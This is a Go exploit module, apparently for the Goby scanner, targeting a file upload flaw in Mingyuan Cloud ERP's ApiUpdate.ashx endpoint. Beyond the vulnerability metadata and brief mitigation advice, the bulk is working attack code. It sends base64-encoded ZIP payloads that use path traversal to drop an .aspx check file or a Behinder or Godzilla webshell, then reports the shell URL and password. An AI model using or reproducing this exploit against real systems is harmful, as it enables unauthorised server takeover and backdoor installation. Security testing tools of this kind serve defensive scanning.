package exploits

import (
	"encoding/base64"
	"git.gobies.org/goby/goscanner/goutils"
	"git.gobies.org/goby/goscanner/jsonvul"
	"git.gobies.org/goby/goscanner/scanconfig"
	"git.gobies.org/goby/httpclient"
	"strings"
)

func init() {
	expJson := `{
    "Name": "Mingyuan cloud ERP ApiUpdate.ashx file upload vulnerability",
    "Description": "<p>Mingyuan Cloud ERP is a set of solutions with real estate informatization as the core.</p><p>There is a file upload vulnerability in Mingyuan Cloud ERP. Attackers construct malicious data packets, causing the system to be attacked and controlled.</p>",
    "Product": "Mingyuan-Yun-ERP",
    "Homepage": "http://www.myunke.com/",
    "DisclosureDate": "2023-08-11",
    "PostTime": "2023-08-12",
    "Author": "m0x0is3ry@foxmail.com",
    "FofaQuery": "body=\"hibot.js\" || body=\".hibot\" || body=\"f96699bbadafca894f3c1b7a\" || title=\"明源云ERP\" || (body=\" window.location.replace('/_base/Home/Error/browser.html?enablemip=0');\" && body=\"深圳市明源云科技有限公司\")",
    "GobyQuery": "body=\"hibot.js\" || body=\".hibot\" || body=\"f96699bbadafca894f3c1b7a\" || title=\"明源云ERP\" || (body=\" window.location.replace('/_base/Home/Error/browser.html?enablemip=0');\" && body=\"深圳市明源云科技有限公司\")",
    "Level": "3",
    "Impact": "<p>Attackers can use this vulnerability to upload files, execute code on the server side, write backdoors, obtain server permissions, and then control the entire web server.</p>",
    "Recommendation": "<p>There is currently no detailed solution provided, please pay attention to the manufacturer's homepage update: <a href=\"http://www.myunke.com/\">http://www.myunke.com/</a></p><p>Temporary fix:</p><p>1. Set access policies and whitelist access through security devices such as firewalls.</p><p>2. If not necessary, prohibit public network access to the system.</p>",
    "References": [],
    "Is0day": false,
    "HasExp": true,
    "ExpParams": [
        {
            "name": "webshell",
            "type": "select",
            "value": "behinder,godzilla",
            "show": ""
        }
    ],
    "ExpTips": {
        "Type": "",
        "Content": ""
    },
    "ScanSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/test.php",
                "follow_redirect": true,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "test",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "ExploitSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/test.php",
                "follow_redirect": true,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "test",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "Tags": [
        "File Upload"
    ],
    "VulType": [
        "File Upload"
    ],
    "CVEIDs": [
        ""
    ],
    "CNNVD": [
        ""
    ],
    "CNVD": [
        ""
    ],
    "CVSSScore": "9.8",
    "Translation": {
        "CN": {
            "Name": "明源云 ERP ApiUpdate.ashx 文件上传漏洞",
            "Product": "明源云-ERP",
            "Description": "<p>明源云 ERP 是一套以房地产信息化为核心的解决方案。<br></p><p>明源云 ERP 存在任意文件上传漏洞，攻击者通过构造恶意数据包，导致系统被攻击与控制。<br></p>",
            "Recommendation": "<p>目前没有详细的解决方案提供，请关注厂商主页更新：<a href=\"http://www.myunke.com/\">http://www.myunke.com/</a></p><p>临时修复方案：</p><p>1、通过防火墙等安全设备设置访问策略，设置白名单访问。</p><p>2、如非必要，禁止公网访问该系统。</p>",
            "Impact": "<p>攻击者可通过该漏洞在服务器端上传文件，执行代码，写入后门，获取服务器权限，进而控制整个 web 服务器。<br></p>",
            "VulType": [
                "文件上传"
            ],
            "Tags": [
                "文件上传"
            ]
        },
        "EN": {
            "Name": "Mingyuan cloud ERP ApiUpdate.ashx file upload vulnerability",
            "Product": "Mingyuan-Yun-ERP",
            "Description": "<p>Mingyuan Cloud ERP is a set of solutions with real estate informatization as the core.<br></p><p>There is a file upload vulnerability in Mingyuan Cloud ERP. Attackers construct malicious data packets, causing the system to be attacked and controlled.<br></p>",
            "Recommendation": "<p>There is currently no detailed solution provided, please pay attention to the manufacturer's homepage update: <a href=\"http://www.myunke.com/\">http://www.myunke.com/</a></p><p>Temporary fix:</p><p>1. Set access policies and whitelist access through security devices such as firewalls.</p><p>2. If not necessary, prohibit public network access to the system.</p>",
            "Impact": "<p>Attackers can use this vulnerability to upload files, execute code on the server side, write backdoors, obtain server permissions, and then control the entire web server.<br></p>",
            "VulType": [
                "File Upload"
            ],
            "Tags": [
                "File Upload"
            ]
        }
    },
    "AttackSurfaces": {
        "Application": null,
        "Support": null,
        "Service": null,
        "System": null,
        "Hardware": null
    },
    "PocId": "10821"
}`

	sendPayloadcc4041b9 := func(hostInfo *httpclient.FixUrl, typ, content string) (*httpclient.HttpResponse, error) {
		cfg := httpclient.NewPostRequestConfig("/myunke/ApiUpdateTool/ApiUpdate.ashx?apiocode=a")
		cfg.VerifyTls = false
		cfg.FollowRedirect = false
		decodedBytes, _ := base64.StdEncoding.DecodeString(content)
		cfg.Data = string(decodedBytes)
		_, err := httpclient.DoHttpRequest(hostInfo, cfg)
		if err != nil {
			return nil, err
		}
		cfgCheck := httpclient.NewGetRequestConfig("/fdccloud/_/" + typ + ".aspx")
		cfgCheck.VerifyTls = false
		cfgCheck.FollowRedirect = false
		return httpclient.DoHttpRequest(hostInfo, cfgCheck)
	}

	ExpManager.AddExploit(NewExploit(
		goutils.GetFileName(),
		expJson,
		func(exp *jsonvul.JsonVul, u *httpclient.FixUrl, ss *scanconfig.SingleScanConfig) bool {
			rsp, err := sendPayloadcc4041b9(u, "check", "UEsDBBQAAAAIAPKaC1eX6YtyjAAAAJMAAAAeAAAALi4vLi4vLi4vZmRjY2xvdWQvXy9jaGVjay5hc3B4JMzLCsIwFATQXwmRQrsJCt1IqyiKUPBRWsT1bRhqIWliHoJ/b8TdMGeYOtuxlkawM81jTGHDDwvOsm2doNHWuMCupOEtyWT9xwdo0dz+E9YlMLOHeLgpIOdSlstyNax5UZ0mBXGEQup7uDecuJBtKTzzDq8IH8TdKbEfvFEx4AdFUaXbLwAAAP//AwBQSwECFAMUAAAACADymgtXl+mLcowAAACTAAAAHgAAAAAAAAAAAAAAAAAAAAAALi4vLi4vLi4vZmRjY2xvdWQvXy9jaGVjay5hc3B4UEsFBgAAAAABAAEATAAAAMgAAAAAAA==")
			if err != nil {
				return false
			}
			return strings.Contains(rsp.Utf8Html, "cc4041b9")
		},
		func(expResult *jsonvul.ExploitResult, ss *scanconfig.SingleScanConfig) *jsonvul.ExploitResult {
			content := ""
			webshell := goutils.B2S(ss.Params["webshell"])
			if webshell == "behinder" {
				// /*该密钥为连接密码32位md5值的前16位，默认连接密码rebeyond*/
				content = "UEsDBBQAAAAIAHubC1d6n5doGwEAAGwBAAAgAAAALi4vLi4vLi4vZmRjY2xvdWQvXy9leHBsb2l0LmFzcHg0j0trwzAQhP+KUDFI1IiQNoeQB3m2BNJS7PYUcpCltePalhxpTdG/r1qS27Dz7e7MPFmRD1kBOUpTDVEs6PaBkmQ5T1aHrrcOybvswPdSRSsPHqETGZQtKKytoX9gDt5HLdZaM9rQlMLzBJ7G0xKKiZ6OJwXlM1IEhNOZNGRB9kZZXZtK7KCUQ4viFXATbc9ul06jM3kklPJURTyD6wAexaY20oUMpGb30dYaBINHMBVe+GztPXRFG8TRRsjAD7kFzkENrsYgti70aCsn+0sQWf1ttIT2TZpYXDMebZAIO1D/mGNNShouPp00vrSue4kJ2k1rVcNUSkYpUeL2+r56MB6lUcDoF+Vifx1k6xleas9nyfIXAAD//wMAUEsBAhQDFAAAAAgAe5sLV3qfl2gbAQAAbAEAACAAAAAAAAAAAAAAAAAAAAAAAC4uLy4uLy4uL2ZkY2Nsb3VkL18vZXhwbG9pdC5hc3B4UEsFBgAAAAABAAEATgAAAFkBAAAAAA=="
			} else if webshell == "godzilla" {
				// 哥斯拉 pass key
				content = "UEsDBBQAAAAIAA6bC1dm6vGpSQIAAIMFAAAgAAAALi4vLi4vLi4vZmRjY2xvdWQvXy9leHBsb2l0LmFzcHjEU11v2jAU/StWJqREY1bbFbSJUq1AuyKBVhGkaUI8mOQCKY6d2g6rVfHfd52Er0pl1V4mHkiuj2/Oufecq9o38sAWQAZMLHJ8aHvdD17t+qpmlCUvRBuViAVZgSVt4n2OmnA2+8K+RueNi4tL5rW2gIxp7RDuf19N4wYWQ6sNpLSTmK4Ua1AGFB3LsID4An5vASFEuUqMpV1lMyMXimVLS4e9RvkeglonETwouU5iUH5AuzLNcgP3TC/9qscYng29FZGMsTntwZzl3NDvYDrWgPYLmh+dnCAI6AgyziLwvU9enXhe0CIzRE2mJGaG7YlXrOmdkmmHaWheVtzxwLjvjeApB20mrvsUu1TX/yptlDyKmAEfMoGTj50iBcxAD6ICpt6pysmpk/djAzpWTOi5VOldIhjvcBmtfMe6Ts7qBX06ALEwSxSTzMlOaAhaJ1JMcM2WSxZ7U9JGnTnnAXrlFIpspYxgziEyeE5vtIZ0xm1gbAZyfgrh+A/BLGXsewPXsn443THex629kKpRucWAbALaF2u5At9RLK/I2SM2L9DFmjYosUU2BLgGrFUd+z/oEFKpLG4aWEpkbqqno7W+gvnYq+xPpJN8StHbw9q6oC+0YcLZc/DLeVPS26eccb3dxmFpx++w6PQV77uw7R2ukN/uEgJulGLWne89rTMpNNCf6FvwMck0zGdlrn00yXkzeBv9KjhjeRSbf84Fuvo/5EIVoVDbRJyQfTykckIb/EXMRMtdAm6fI8icGVxmNrXrPwAAAP//AwBQSwECFAMUAAAACAAOmwtXZurxqUkCAACDBQAAIAAAAAAAAAAAAAAAAAAAAAAALi4vLi4vLi4vZmRjY2xvdWQvXy9leHBsb2l0LmFzcHhQSwUGAAAAAAEAAQBOAAAAhwIAAAAA"
			}

			rsp, err := sendPayloadcc4041b9(expResult.HostInfo, "exploit", content)
			if err != nil {
				expResult.Success = false
				expResult.Output = err.Error()
				return expResult
			}
			// 资源存在
			if rsp.StatusCode != 200 && rsp.StatusCode != 500 {
				expResult.Success = false
				expResult.Output = "漏洞利用失败"
				return expResult
			}
			expResult.Success = true
			expResult.Output += "WebShell URL: " + expResult.HostInfo.FixedHostInfo + rsp.Request.URL.Path + "\n"
			if webshell == "behinder" {
				expResult.Output += "Password: rebeyond\n"
				expResult.Output += "WebShell tool: Behinder v3.0\n"
			} else if webshell == "godzilla" {
				expResult.Output += "Password: pass 加密器：CSHAP_AES_BASE64\n"
				expResult.Output += "WebShell tool: Godzilla v4.1\n"
			}
			expResult.Output += "Webshell type: aspx"
			return expResult
		},
	))
}
